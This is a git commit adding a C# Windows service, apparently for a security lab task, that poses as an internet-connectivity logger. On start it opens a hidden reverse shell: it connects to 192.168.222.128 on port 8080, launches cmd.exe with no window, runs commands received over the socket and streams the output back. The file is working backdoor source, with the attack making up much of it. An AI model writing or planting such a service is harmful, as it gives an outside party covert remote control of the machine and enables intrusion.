f5bc16a9a3ec874811a53838a145267ba4de72e9
cuongnpvn <18520545@gm.uit.edu.vn>
2021-04-02 17:34:41 +0700

    first commit

---
+++ task3/Service1.cs
@@ -0,0 +1,144 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.ServiceProcess;
+using System.Text;
+using System.Timers;
+
+namespace task3
+{
+    public partial class Service1 : ServiceBase
+    {
+        Timer timer = new Timer();
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            int configTime = 10000;
+            WriteToFile("Service is started at " + DateTime.Now);
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = configTime;
+            timer.Enabled = true;
+
+
+            // create reverse shell
+            try
+            {
+                using (TcpClient client = new TcpClient("192.168.222.128", 8080))
+                {
+                    using (Stream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream);
+
+                            StringBuilder strInput = new StringBuilder();
+
+                            Process p = new Process();
+                            p.StartInfo.FileName = "cmd.exe";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+
+                            while (true)
+                            {
+                                strInput.Append(rdr.ReadLine());
+                                //strInput.Append("\n");
+                                p.StandardInput.WriteLine(strInput);
+                                strInput.Remove(0, strInput.Length);
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                // print out error
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            bool connectionCheck = CheckInternetConnection();
+            if (connectionCheck == true)
+            {
+                WriteToFile("You are online. Recorded at " + DateTime.Now);
+            }
+            else
+            {
+                WriteToFile("You are offline. Recorded at " + DateTime.Now);
+            }
+        }
+        public void WriteToFile(string message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(message);
+                }
+            }
+        }
+        public static bool CheckInternetConnection()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (client.OpenRead("http://google.com/"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        static StreamWriter streamWriter;
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception)
+                {
+                    // silence is golden
+                }
+            }
+        }
+    }
+}
